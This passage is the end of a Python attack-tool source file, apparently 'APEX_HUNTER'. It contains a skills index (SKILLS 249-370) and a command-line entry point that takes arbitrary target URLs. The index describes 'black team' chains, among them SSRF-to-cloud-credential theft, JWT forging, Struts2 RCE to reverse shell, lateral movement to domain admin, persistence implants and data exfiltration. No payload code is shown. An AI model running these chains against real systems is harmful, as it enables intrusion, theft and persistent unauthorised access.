SKILL-249 SSTI extended — FreeMarker Execute built-in, Jinja2 subclass chain, Smarty PHP tag
SKILL-250 OAuth2 extended — PKCE downgrade re-scan, state fixation, authorization code interception
SKILL-251 Azure AD extended — admin consent abuse, sync provisioning endpoint, graph API probe
SKILL-252 S3 extended — X-Amz-Signature extraction, bucket takeover, lifecycle policy abuse
SKILL-253 Nginx extended — double-slash bypass, %2e%2e traversal, stub_status per-vhost
SKILL-254 Traefik extended — TCP router exposure, middlewares chain, Jaeger tracing endpoint
SKILL-255 ArgoCD extended — terminal access probe, certificate store, GPG key endpoint
SKILL-256 DOM Clobber extended — window.name poisoning, document.referrer, postMessage origin bypass
SKILL-257 Padding oracle extended — 6 token formats, CBC-MAC forgery surface, HMAC timing
SKILL-258 PRNG extended — UUID v1 prediction, LFSR detection, MT19937 seed recovery
SKILL-259 gRPC extended — channelz topology, health streaming, TLS client cert bypass
SKILL-260 Kerberos extended — ticket cache path, memory dump indicators, pass-the-ticket surface
SKILL-261 Struts2 extended — WEB-INF disclosure, .do action mapping, REST plugin XStream
SKILL-262 Log4Shell extended — all 8 obfuscation patterns, nested variable lookups, env leak
SKILL-263 Mobile keys extended — Tencent Cloud, Square, Vercel, Netlify token patterns
SKILL-264 WS-SSRF extended — STOMP/MQTT/AMQP-WS protocol, binary frame SSRF, connection_init
SKILL-265 Helm extended — kubeconfig, sealed-secrets, external-secrets, SOPS-encrypted files
SKILL-266 Gateway extended — Kong admin API, Istio telemetry, Envoy admin port
SKILL-267 CSRF extended — Flash CSRF, multipart boundary injection, preflight cache abuse
SKILL-268 XXE extended — XLIFF parameter entity, error-based XXE, blind OOB via FTP
SKILL-269 BFLA extended — GraphQL mutation privilege, REST verb confusion, mass-assign admin role
SKILL-270 DNS Exfil extended — AAAA record exfil, TXT record channel, SRV record covert channel
SKILL-271 Serverless extended — function key brute, environment variable SSTI, VPC internal reach
SKILL-272 OGNL WAF bypass — Unicode normalisation, comment injection, multi-step OGNL chain
SKILL-273 EL WAF bypass — bracket notation, reflection via getClass, getMethod pivot
SKILL-274 Combined cloud pivot — Azure+AWS+GCP simultaneous IMDS probe, cross-cloud IAM
SKILL-275 Full Struts2 chain — version fingerprint → CVE match → Content-Type RCE → reverse shell
SKILL-276 Log4Shell → RCE chain — JNDI callback → LDAP marshalled object → ClassLoader load
SKILL-277 Full JWT attack chain — kid injection + alg=none + audience bypass + PKCE downgrade
SKILL-278 Complete XXE chain — local file read + SSRF + IMDS + cloud credential exfil
SKILL-279 BFLA → privilege chain — header bypass + JWT forge + admin function + data exfil
SKILL-280 Ultimate attack surface map — all 13 phases aggregated, top-10 risk, executive summary

NEW (Phase 14 — RED+BLACK TEAM — 70 Advanced Exploitation Skills):
SKILL-281 HTTP request smuggling frontend — CL.0, TE.0, H2.TE, TE-OBF, CL-DUPE variants
SKILL-282 Web cache deception advanced — static-ext URL cache, 6 unkeyed header poison probes
SKILL-283 API gateway bypass — 11 path normalisation variants + 10 IP/header bypass techniques
SKILL-284 Race condition advanced — 9 endpoints × 10 parallel threads, double-spend/limit bypass
SKILL-285 GraphQL deep exploit — introspection dump, field suggestion, alias bypass, mutation admin
SKILL-286 OAuth2 token theft — open redirect in redirect_uri, 7 bypass variants, state fixation
SKILL-287 Subdomain takeover advanced — 21 provider fingerprints: S3/GitHub/Heroku/Azure/Fastly/Netlify
SKILL-288 XSS advanced payloads — CSP bypass, polyglot, SVG animate, base tag hijack, template literal
SKILL-289 JWT HMAC secret brute — 35 weak secrets × HS256/384/512, Python forge PoC
SKILL-290 SSRF advanced chain — 17 bypass variants: gopher/dict/file/ldap/IPv6/hex/decimal/octal/at-sign
SKILL-291 Lateral movement path map — 15 services, pivot method for each, network range analysis
SKILL-292 Persistence mechanism detector — webhook SSRF registration, scheduler, automation endpoints
SKILL-293 Cloud storage enumeration — 17 bucket name patterns × S3 (6 regions) + GCS
SKILL-294 Credential stuffing mapper — 8 auth endpoints, rate-limit detection, lockout analysis
SKILL-295 TLS attack surface — BEAST/POODLE/DROWN/SWEET32/FREAK weak version+cipher detection
SKILL-296 Password policy analyzer — 10 weak passwords × 4 change endpoints, brute resistance scoring
SKILL-297 GraphQL full schema harvest — complete introspection dump, type/mutation/subscription count
SKILL-298 Zero-trust bypass detector — 11 identity header injections, SPIFFE spoof, mTLS bypass
SKILL-299 API versioning abuse — 16 version patterns × 6 sensitive endpoints, deprecated API detection
SKILL-300 Binary file analyzer — APK/IPA/EXE string extraction, 17 secret patterns, embedded URL harvest
SKILL-301 HTTP smuggling extended — timing-based H2.CL, connection-state desync, partial body reuse
SKILL-302 Cache deception extended — cookie-based cache bypass, CDN vendor-specific headers
SKILL-303 Gateway bypass extended — encoded slashes, semicolon bypass, matrix params, path parameters
SKILL-304 Race condition extended — TOCTOU file upload, JWT issuance race, session fixation race
SKILL-305 GraphQL extended — subscription SSRF, persisted query injection, cost/complexity bypass
SKILL-306 OAuth2 extended — PKCE code injection, token refresh race, implicit→code upgrade bypass
SKILL-307 Subdomain takeover extended — CT log cross-reference, CNAMEd SaaS service reclaim
SKILL-308 XSS extended — DOM sink chaining, postMessage origin bypass, iframe sandbox escape
SKILL-309 JWT extended — RSA-to-HMAC confusion, kid SQL injection, jwks_uri SSRF, none+header combo
SKILL-310 SSRF extended — Gopher Redis/SMTP/MySQL pivot, TFTP, FTP bounce, blind OOB timing
SKILL-311 Lateral extended — Docker pivot, K8s pod exec, SMB relay chain, pass-the-hash path
SKILL-312 Persistence extended — OAuth2 long-lived token implant, API key persistence, service binding
SKILL-313 Cloud storage extended — Azure Blob SAS token abuse, GCS signed URL bypass, presign replay
SKILL-314 Cred stuffing extended — Username enumeration timing, account oracle, lockout bypass
SKILL-315 TLS extended — cert expiry analysis, SAN mismatch, self-signed detection, HSTS preload
SKILL-316 Password extended — reset token entropy, forgot-password oracle, token reuse window
SKILL-317 GraphQL schema extended — deprecated field mining, hidden mutation discovery, type confusion
SKILL-318 Zero-trust extended — Istio header bypass, Envoy admin API, Consul ACL token theft
SKILL-319 API version extended — v0/shadow API probe, CHANGELOG endpoint, version header injection
SKILL-320 Binary extended — native library analysis, certificate pinning bypass hints, debug build detection
SKILL-321 Smuggling chain — CL.TE → cache poison → stored XSS delivery chain
SKILL-322 Cache poison → XSS chain — unkeyed header → reflected body → stored in CDN
SKILL-323 Gateway bypass → BFLA chain — path confusion → admin endpoint → data exfil
SKILL-324 Race condition → privilege — parallel registration → duplicate admin → full takeover
SKILL-325 GraphQL → SSRF chain — mutation field URL → internal service probe → IMDS
SKILL-326 OAuth2 → ATO chain — redirect_uri → code theft → token exchange → account takeover
SKILL-327 Takeover → phishing chain — dangling CNAME → malicious page → cookie theft
SKILL-328 XSS → CSRF chain — stored XSS → CSRF token steal → state-changing action
SKILL-329 JWT crack → privilege — weak secret → admin token forge → BFLA → data exfil
SKILL-330 SSRF → cloud → lateral — SSRF → IMDS → IAM creds → cloud API → internal pivot
SKILL-331 Lateral → persistence — RCE → webhook register → cron implant → persistent access
SKILL-332 Cloud storage → secrets — bucket list → .env download → API key → full account
SKILL-333 Cred stuff → pivot — valid creds → internal API → lateral movement → domain admin
SKILL-334 TLS downgrade → MitM — BEAST/POODLE → session decrypt → credential intercept
SKILL-335 Binary → hardcoded → exploit — APK decompile → API key → authenticated API abuse
SKILL-336 Zero-trust → lateral — SPIFFE spoof → service mesh → backend service → data
SKILL-337 API version → unpatched — deprecated v1 → missing auth → IDOR → PII exfil
SKILL-338 Persistence → long-term — webhook SSRF → cron → rotating credentials → stealth
SKILL-339 Full attack chain synthesis — all Phase 14 findings combined into kill chain narrative
SKILL-340 Phase 14 risk scorecard — weighted score update, delta from Phase 13, executive delta report
SKILL-341 Smuggling + Gateway combined — desync at CDN → bypass WAF → reach internal admin
SKILL-342 Cache + XSS + CSRF combined — CDN cache poison → victim session steal → CSRF
SKILL-343 Race + JWT + OAuth combined — parallel token requests → race window → token theft
SKILL-344 GraphQL + SSRF + Cloud combined — GQL URL field → SSRF → IMDS → full cloud pivot
SKILL-345 Takeover + Phishing + OAuth combined — subdomain takeover → OAuth redirect_uri → ATO
SKILL-346 Binary + API Key + Cloud combined — mobile APK → hardcoded key → AWS → lateral move
SKILL-347 TLS + NTLM + Kerberos combined — downgrade → relay → hash capture → domain admin
SKILL-348 Zero-Trust + K8s + Docker combined — identity spoof → service mesh → container escape
SKILL-349 All-phase mega chain — 14-phase findings synthesized into single kill chain narrative
SKILL-350 Final comprehensive scorecard — 340 tools, 350 skills, all phases, complete risk matrix

PHASE 15 [BLACK TEAM] — SKILLS 351-370
────────────────────────────────────────────────────────────
SKILL-351 OAuth2 redirect_uri bypass → token hijack via fragment leakage and open redirect chains
SKILL-352 HTTP request desync TE.0/CL.0 — smuggling probe to detect frontend/backend processing gaps
SKILL-353 JWT secret brute-force — 26+ common secrets plus host/apex derivation for HMAC-SHA256
SKILL-354 DNS subdomain brute-force — 64-word wordlist resolution for live host discovery
SKILL-355 GraphQL IDOR — 8 query patterns for object-level auth bypass and introspection abuse
SKILL-356 CORS origin bypass — 8 patterns including null, suffix, subdomain, and credential chains
SKILL-357 OpenAPI/Swagger fuzzer — hidden parameters and undocumented endpoint discovery
SKILL-358 Azure Blob public enum — container naming pattern detection for public storage exposure
SKILL-359 Session fixation — pre/post-auth cookie comparison for token reuse vulnerabilities
SKILL-360 CRLF + cache poisoning — 6 CRLF payloads plus 7 unkeyed header injection techniques
SKILL-361 Cryptographic weakness — MD5/SHA-1/UUID-v1/weak cipher detection in cookies and tokens
SKILL-362 Sensitive file deep scan — 200+ paths: IDE, CI/CD, cloud config, logs, framework artifacts
SKILL-363 Rate-limit bypass advanced — 9 IP spoof headers combined with auth endpoint slow-rate
SKILL-364 API key exposure advanced — 9 key regex patterns across 12 config and settings endpoints
SKILL-365 Cloud metadata pivot chain — AWS/Azure/GCP step-by-step lateral movement from SSRF findings
SKILL-366 Full chain report generator — aggregated attack narrative with remediation priority matrix
SKILL-367 OAuth2 re-test chain — second-pass token hijack with expanded redirect_uri corpus
SKILL-368 HTTP desync re-probe — TE-OBF and H2-UPGRADE desync variants on alternate paths
SKILL-369 JWT crack extended pass — key derivation from discovered domain names and common patterns
SKILL-370 Subdomain pivot chain — brute-force discovered hosts re-fed into full Phase 1 recon
"""

# ══════════════════════════════════════════════════════════════
# CLI ENTRY POINT
# ══════════════════════════════════════════════════════════════
def main():
    p = argparse.ArgumentParser(
        description="APEX_HUNTER v1.0 — 360 Tools | 370 Skills | Auto-Chain",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python APEX_HUNTER.py --target https://example.com --output ./results
  python APEX_HUNTER.py --target https://t1.com --target https://t2.com --output ./out
  python APEX_HUNTER.py --target https://example.com --output ./out --phases 1,2,3,7,8,9
  python APEX_HUNTER.py --target https://example.com --output ./out --workers 15 --rate 3.0
  python APEX_HUNTER.py --skills
""")
    p.add_argument("--target","-t", action="append", default=[], dest="targets",
                   help="Target URL (repeatable for multiple targets)")
    p.add_argument("--output","-o", default="./apex_output", help="Output directory")
    p.add_argument("--workers",  type=int,   default=10,  help="Concurrent workers")
    p.add_argument("--rate",     type=float, default=2.0, help="Requests per second")
    p.add_argument("--depth",    type=int,   default=3,   help="Crawl depth")
    p.add_argument("--timeout",  type=int,   default=20,  help="Request timeout (seconds)")
    p.add_argument("--scope",    action="append", default=[], dest="scope_extras")
    p.add_argument("--phases",   default="1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",
                   help="Phases to run (default: 1-15, e.g. 1,2,7,8,9,10,11,12,13,14,15)")
    p.add_argument("--skills",   action="store_true", help="Print skills index and exit")
    args = p.parse_args()

    if args.skills:
        print(SKILLS_INDEX); sys.exit(0)

    if not args.targets:
        p.print_help()
        print(f"\n{C.RED}Error: at least one --target required{C.NC}")
        sys.exit(1)

    try:
        phases = [int(x.strip()) for x in args.phases.split(",")]
    except ValueError:
        print(f"{C.RED}Error: --phases must be comma-separated integers{C.NC}"); sys.exit(1)

    cfg = Config(
        targets=args.targets, output=args.output,
        workers=args.workers, rate=args.rate, depth=args.depth,
        timeout=args.timeout, scope_extras=args.scope_extras, phases=phases)
    APEXOrchestrator(cfg).run()

if __name__ == "__main__":
    main()
